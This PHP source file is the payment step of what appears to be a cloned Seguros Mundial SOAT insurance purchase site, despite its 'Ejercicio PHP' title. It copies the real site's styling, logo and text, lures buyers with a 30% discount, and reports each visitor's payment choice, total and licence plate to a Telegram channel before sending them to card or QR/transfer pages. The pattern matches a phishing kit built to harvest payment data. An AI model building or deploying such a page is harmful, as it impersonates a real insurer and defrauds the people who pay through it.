<?php

session_start();
require_once __DIR__ . '/includes/calculo.php';
require_once __DIR__ . '/includes/security.php';
require_once __DIR__ . '/includes/telegram.php';

if (empty($_SESSION['cotizacion']) || empty($_SESSION['resumen'])) {
    header('Location: index.php');
    exit;
}

$cot     = $_SESSION['cotizacion'];
$sel     = $_SESSION['seleccion'] ?? [];
$resumen = $_SESSION['resumen'];

$nombres = $_SESSION['propietario']['nombres'] ?? 'MARIA';

$inicioVigencia = new DateTime('today');
$finVigencia    = (clone $inicioVigencia)->modify('+1 year -1 day');

$medioPagoSel = $_SESSION['medio_pago'] ?? null;
$errores = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $medioPagoSel = $_POST['medio_pago'] ?? null;

    if (empty($medioPagoSel)) {
        $errores[] = 'Selecciona un medio de pago para continuar.';
    }

    if (empty($errores)) {
        $_SESSION['medio_pago'] = $medioPagoSel;

        // Notificar a Telegram el medio elegido
        $mediosTexto = [
            'qr'      => 'Código QR / Transferencia',
            'tarjeta' => 'Tarjeta Crédito/Débito',
        ];
        telegram_medio_pago(
            $mediosTexto[$medioPagoSel] ?? $medioPagoSel,
            formato_cop($resumen['total']),
            $cot['placa'] ?? '—'
        );

        if ($medioPagoSel === 'tarjeta') {
            header('Location: pago-con-tarjeta.php');
            exit;
        }
        if ($medioPagoSel === 'qr') {
            header('Location: qr/index.php');
            exit;
        }
    }
}

$tieneDescuento = !empty($resumen['descuento_soat']) && $resumen['descuento_soat'] > 0;
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="theme-color" content="#FFFFFF">
<title>Pago | Ejercicio PHP</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/component---src-pages-informacion-vehiculo-tsx.afa77d34e9e72fc40a52.css">
<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
<link rel="stylesheet" href="assets/css/styles_ltr.css">
<style>
.inf-vehiculo-form-module--container--a17d4 {
    max-width: 720px;
    margin: 40px auto;
    padding: 0 20px;
    box-sizing: border-box;
}

.pago-form-wrapper {
    flex-direction: column;
    align-items: stretch;
    max-width: 640px;
    width: 100%;
    margin-left: auto;
    margin-right: auto;
}

.pago-form-wrapper .form-stages-module--stages--99ccc {
    margin-left: 0;
    margin-right: 0;
    width: 100%;
}

.pago-saludo {
    text-align: center;
    width: 100%;
    margin-bottom: 10px;
}
.pago-saludo h1 {
    font-size: 1.6rem;
    font-weight: 700;
    color: #066188;
    margin: 0 0 4px;
}
.pago-saludo p {
    font-size: 1.1rem;
    font-weight: 700;
    color: #0a99d6;
    margin: 0;
}

.pago-detalle {
    width: 100%;
    margin: 10px 0;
}
.pago-detalle-fila {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 20px;
    padding: 6px 0;
    color: #4d4d4f;
    font-size: .95rem;
}
.pago-detalle-fila strong {
    color: #000;
    font-weight: 700;
}
.pago-detalle-fila span:last-child {
    text-align: right;
    white-space: nowrap;
}
.pago-detalle-fila.valor-soat {
    font-weight: 700;
    color: #066188;
    border-top: 1px solid #e8e8ed;
    margin-top: 6px;
    padding-top: 14px;
}

/* Filas de descuento */
.pago-descuento-oficial {
    display: flex;
    justify-content: space-between;
    gap: 20px;
    padding: 6px 0;
    color: #828285;
    font-size: .95rem;
}
.pago-descuento-oficial .valor-tachado {
    text-decoration: line-through;
    color: #828285;
    text-align: right;
    white-space: nowrap;
}
.pago-descuento-descuento {
    display: flex;
    justify-content: space-between;
    gap: 20px;
    padding: 8px 12px;
    background: #eafaf1;
    border-radius: 6px;
    color: #15d064;
    font-weight: 700;
    font-size: .95rem;
    margin: 6px 0;
}
.pago-descuento-descuento span:last-child {
    text-align: right;
    white-space: nowrap;
}

.pago-valor-total {
    display: flex;
    justify-content: space-between;
    align-items: baseline;
    width: 100%;
    margin: 10px 0 20px;
}
.pago-valor-total h2 {
    font-size: 1.3rem;
    font-weight: 700;
    color: #066188;
    margin: 0;
}
.pago-valor-total .monto {
    font-size: 1.5rem;
    font-weight: 700;
    color: #066188;
}

.pago-medios-titulo {
    width: 100%;
    font-size: 1rem;
    font-weight: 700;
    color: #0a99d6;
    margin: 0 0 12px;
}

.pago-medio-opcion {
    display: flex;
    align-items: center;
    gap: 10px;
    border: 1px solid #d9e8f0;
    border-radius: 10px;
    padding: 10px 14px;
    margin-bottom: 10px;
    width: 100%;
    box-sizing: border-box;
    cursor: pointer;
    transition: border-color .2s, background-color .2s;
}
.pago-medio-opcion:hover {
    border-color: #0a99d6;
    background-color: #f5fbfe;
}
.pago-medio-opcion input[type="radio"] {
    margin-left: auto;
    width: 18px;
    height: 18px;
    accent-color: #0a99d6;
    flex-shrink: 0;
}
.pago-medio-icono {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    background: #eef5fb;
    overflow: hidden;
}
.pago-medio-icono img { width: 100%; height: 100%; object-fit: contain; }
.pago-medio-texto {
    font-size: .85rem;
    font-weight: 600;
    color: #1a1a1a;
    line-height: 1.3;
}

.pago-aviso-vigencia {
    width: 100%;
    color: #b5651d;
    font-weight: 700;
    font-size: .85rem;
    margin: 12px 0 6px;
}

@media (max-width: 48rem) {
    .inf-vehiculo-form-module--container--a17d4 {
        max-width: 100%;
        padding: 0;
        margin: 20px auto;
    }
    .pago-form-wrapper {
        max-width: 100%;
    }
    .pago-form-wrapper .form-stages-module--stages--99ccc {
        margin-left: 8%;
        margin-right: 8%;
    }
    .pago-medio-opcion {
        padding: 8px 10px;
        gap: 8px;
    }
    .pago-medio-icono {
        width: 18px;
        height: 18px;
    }
    .pago-medio-texto {
        font-size: .78rem;
    }
    .pago-saludo h1 { font-size: 1.3rem; }
    .pago-saludo p  { font-size: 1rem; }
}

.pago-mensaje-error {
    background:#fdecea;
    border:1px solid #f5c2c0;
    color:#7a2a24;
    border-radius:8px;
    padding:12px 16px;
    margin-bottom:16px;
    width: 100%;
    box-sizing: border-box;
}
.pago-mensaje-error ul { margin:8px 0 0 18px; padding:0; }
</style>
</head>
<body>
<div id="___gatsby">
<div tabindex="-1" id="gatsby-focus-wrapper" style="outline: none;">

<?php include __DIR__ . '/includes/header.php'; ?>

<nav class="menu-module--menu--ff100">
  <div class="menu-module--menu__container--550e5">
    <div class="logo-module--wrapper__logo--d2507">
      <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
           src="assets/img/imagen_1_.png"
           width="609" height="136" alt="seguros mundial" title="seguros mundial">
    </div>
    <div class="menu-module--menu__container__logos--cd40c" data-ally="false"></div>
  </div>
  <ul class="menu-module--menu__items--6eadc">
    <li class="menu-item-module--menu_item--04780 menu-item-module--display_none--19788 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">Comprar SOAT</button></div>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <button data-theme="menu-item" class="button-icon-module--button--c6d67" type="button">
          <div class="button-icon-module--button__text--80959">SOAT
            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                 height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </div>
        </button>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">QUIERO RENOVAR MI SOAT</button></div>
      </div>
    </li>
  </ul>
</nav>

<main>
<section class="inf-vehiculo-form-module--container--a17d4">
  <form class="form-module--form--731f9 pago-form-wrapper" method="post" action="pago.php">

    <div class="pago-saludo">
      <h1>¡<?= htmlspecialchars(strtoupper($nombres)) ?>!</h1>
      <p>ya puedes pagar tu SOAT</p>
    </div>

    <div class="form-stages-module--stages--99ccc">
      <div class="form-stages-module--stages__item--51e51">
        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">1</div>
        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Cotiza</div>
      </div>
      <div class="form-stages-module--stages__separator--f88c2"></div>
      <div class="form-stages-module--stages__item--51e51">
        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">2</div>
        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Resumen</div>
      </div>
      <div class="form-stages-module--stages__separator--f88c2"></div>
      <div class="form-stages-module--stages__item--51e51">
        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">3</div>
        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Pago</div>
      </div>
    </div>

    <?php if (!empty($errores)): ?>
      <div class="pago-mensaje-error">
        <strong>Revisa lo siguiente:</strong>
        <ul>
          <?php foreach ($errores as $error): ?>
            <li><?= htmlspecialchars($error) ?></li>
          <?php endforeach; ?>
        </ul>
      </div>
    <?php endif; ?>

    <div class="pago-detalle">
      <div class="pago-detalle-fila">
        <span>Inicio de vigencia</span>
        <span><?= $inicioVigencia->format('d/m/Y') ?></span>
      </div>
      <div class="pago-detalle-fila">
        <span>Final de vigencia</span>
        <span><?= $finVigencia->format('d/m/Y') ?></span>
      </div>
      <div class="pago-detalle-fila">
        <strong>Tipo de vehículo</strong>
        <strong><?= htmlspecialchars($cot['vehiculo']['clase']) ?></strong>
      </div>

      <?php if ($tieneDescuento): ?>
        <div class="pago-descuento-oficial">
          <span>Valor SOAT oficial</span>
          <span class="valor-tachado"><?= formato_cop($resumen['valor_soat_oficial']) ?></span>
        </div>
        <div class="pago-descuento-descuento">
          <span>Descuento 30% 🎉</span>
          <span>-<?= formato_cop($resumen['descuento_soat']) ?></span>
        </div>
      <?php endif; ?>

      <div class="pago-detalle-fila valor-soat">
        <span>SOAT</span>
        <span><?= formato_cop($resumen['subtotal_soat']) ?></span>
      </div>

      <?php if ($resumen['terceros']): ?>
      <div class="pago-detalle-fila">
        <span>Seguro Tercero Voluntario</span>
        <span><?= formato_cop($resumen['subtotal_terceros']) ?></span>
      </div>
      <?php endif; ?>
      <?php if ($resumen['accidentes']): ?>
      <div class="pago-detalle-fila">
        <span>Accidentes Personales (<?= htmlspecialchars($resumen['accidentes']['label']) ?>)</span>
        <span><?= formato_cop($resumen['subtotal_accidentes']) ?></span>
      </div>
      <?php endif; ?>
    </div>

    <div class="pago-valor-total">
      <h2>Valor Total</h2>
      <span class="monto"><?= formato_cop($resumen['total']) ?></span>
    </div>

    <p class="pago-medios-titulo">Elige el medio de pago</p>

    <!-- Opción QR (Redirige a la carpeta /qr/) -->
    <label class="pago-medio-opcion">
      <span class="pago-medio-icono">
        <img src="qr/logo.png" alt="QR">
      </span>
      <span class="pago-medio-texto">Pago con Código QR / Transferencia</span>
      <input type="radio" name="medio_pago" value="qr" <?= $medioPagoSel === 'qr' ? 'checked' : '' ?>>
    </label>

    <!-- Opción Tarjeta / Otros -->
    <label class="pago-medio-opcion">
      <span class="pago-medio-icono">
        <img src="assets/img/visa.png" alt="Tarjeta">
      </span>
      <span class="pago-medio-texto">Tarjeta Crédito / Débito (Visa, MasterCard), Nequi y Bancolombia: tú eliges.</span>
      <input type="radio" name="medio_pago" value="tarjeta" <?= $medioPagoSel === 'tarjeta' ? 'checked' : '' ?>>
    </label>

    <p class="pago-aviso-vigencia">¡Pilas antes de pagar verifica que la vigencia de tu póliza este correcta!</p>

    <p class="inf-vehiculo-form-module--form__info_vehiculo__tooltiptext--aedd9" style="width:100%;">
      *Si tu vehículo aplica para más de una clasificación, cerciórate de elegir la correcta.
      Para la tarifa de Servicio Público, debes seleccionar la tarifa que tienes autorizada en
      la Tarjeta de Operación. Seguros Mundial no se hace responsable si eliges la tarifa que no aplica.
    </p>

    <section class="return-next-buttons-container-module--container__buttons--2a423">
      <a href="informacion-vehiculo.php" class="button-old-module--decline--6bd21">Regresar</a>
      <button type="submit" class="button-old-module--accept--3b47a button-old-module--button--9a043">Ir a pagar</button>
    </section>

  </form>
</section>
</main>

<?php include __DIR__ . '/includes/footer.php'; ?>

</div>
</div>
</body>
</html>